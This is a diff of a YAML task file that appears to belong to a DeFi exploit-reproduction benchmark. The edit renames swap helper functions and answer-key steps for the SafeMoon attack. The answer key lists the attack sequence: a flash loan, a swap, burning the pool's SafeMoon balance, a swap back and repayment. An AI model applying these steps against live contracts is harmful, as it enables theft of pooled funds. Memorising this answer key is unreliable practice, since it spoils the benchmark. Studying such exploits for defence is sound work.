@@ -33,7 +33,7 @@ ctrt_name2deploy:
   - ["router", "new SafeswapRouterProxy1()"]
     
 extra_actions: 
-  - "function swap_safemoon_attacker_weth_safemoon(uint256 amount, uint256 amountOut) internal eurus {
+  - "function swap_pair_attacker_weth_safemoon(uint256 amount, uint256 amountOut) internal eurus {
       address[] memory path = new address[](2);
         path[0] = address(weth);
         path[1] = address(safemoon);
@@ -52,7 +52,7 @@ extra_actions:
             trade
         );
     }"
-  - "function swap_safemoon_attacker_safemoon_weth(uint256 amount, uint256 amountOut) internal eurus {
+  - "function swap_pair_attacker_safemoon_weth(uint256 amount, uint256 amountOut) internal eurus {
       address[] memory path = new address[](2);
       path[0] = address(safemoon);
       path[1] = address(weth);
@@ -103,9 +103,9 @@ attack_goal_str: "weth;1e6"
 
 groundtruth:
   - ["borrow", "weth", "owner", "1000 ether"]
-  - ["swap", "safemoon", "attacker", "weth", "safemoon", "800 * 1e18", "0"]
+  - ["swap", "pair", "attacker", "weth", "safemoon", "800 * 1e18", "0"]
   - ["burn", "safemoon", "pair", "safemoon.balanceOf(address(pair)) - 1000000000"]
-  - ["swap", "safemoon", "attacker", "safemoon", "weth", "safemoon.balanceOf(address(attacker))", "0"]
+  - ["swap", "pair", "attacker", "safemoon", "weth", "safemoon.balanceOf(address(attacker))", "0"]
   - ["payback", "weth", "owner", "1000 ether"]
 
 
